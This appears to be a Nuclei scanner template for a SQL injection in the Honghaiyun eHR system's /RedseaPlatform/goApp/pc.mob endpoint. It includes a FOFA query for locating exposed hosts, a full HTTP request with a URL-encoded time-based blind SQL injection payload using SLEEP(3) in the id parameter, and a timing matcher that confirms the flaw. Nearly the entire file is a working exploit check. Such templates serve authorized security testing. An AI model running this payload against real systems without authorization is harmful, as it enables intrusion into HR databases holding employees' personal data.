id: honghaiyun-pc-mob-SQL

info:
  name: 红海云eHR系统pc.mob SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa-query: body="/RedseaPlatform/skins/images/favicon.ico"

  tags: SQL Injection

http:
  - raw:
      - |
        GET /RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(3)))ndMq)%20AND%20%27NEoX%27=%27NEoX HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Upgrade-Insecure-Requests: 1


    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3  && duration<=6 && status_code==200"